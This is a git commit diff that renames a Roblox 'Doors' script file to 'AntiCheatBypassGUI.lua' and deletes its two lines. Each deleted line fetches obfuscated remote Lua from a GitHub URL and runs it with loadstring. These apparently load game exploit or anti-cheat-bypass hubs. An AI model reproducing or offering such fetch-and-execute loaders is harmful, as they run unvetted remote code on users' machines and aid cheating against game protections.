c770fe3321f1fcc2900bb21768a199ba5312075f
Darryl Alcander Lim <103663597+user2949@users.noreply.github.com>
2024-09-12 16:49:34 +0700

    Update and rename DoorsScript.lua to AntiCheatBypassGUI.lua

--- DoorsScript.lua
+++
@@ -1,2 +0,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/BlackKing-obf/main/Doors%20Blackking%20And%20BobHub"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Yumiara/Python/main/Main.lua"))()
